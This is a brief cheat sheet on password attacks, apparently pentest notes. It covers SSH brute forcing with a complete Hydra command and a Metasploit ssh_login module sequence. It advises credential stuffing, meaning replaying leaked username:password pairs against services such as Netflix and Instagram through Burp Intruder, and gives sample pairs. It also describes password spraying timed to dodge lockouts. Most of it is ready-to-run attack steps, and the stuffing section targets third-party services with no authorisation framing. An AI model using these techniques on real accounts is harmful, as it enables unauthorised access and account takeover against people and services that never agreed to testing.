# Password Attacks 101

## Brute force

When you see an exposed auth (eg. SSH) try brute forcing to test password strength and detect weak/default creds. During pentests we may be loud on purpose to see detection.

- Hydra example:

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.4:22 -t 4 -V
```

- Metasploit aux scanner:

```
msfconsole
search ssh
use auxiliary/scanner/ssh/ssh_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set RHOSTS 10.0.2.4
set THREADS 10
set VERBOSE true
run
```

## Credential stuffing

Replay leaked username:password pairs from breaches against services (Netflix, Instagram, etc.). Fast, low-effort checks, use Pitchfork mode in Burp Intruder to align username->password pairs.

- Example leaked creds:

```
alice@gmail.com:qwerty123
bob@yahoo.com:letmein2020
```

Use Burp Intruder → Payloads → Pitchfork (one list usernames, other list passwords) to test matched pairs.

## Password spraying

Try one/few common passwords across many users to avoid account lockouts (1–2 attempts/user). Good for large directories.

- Example: try `Spring2024!` against:

```
alice@example.com
bob@example.com
carol@example.com
```

Use Burp Intruder Sniper or a custom script; spacing attempts over time to reduce lockout risk.
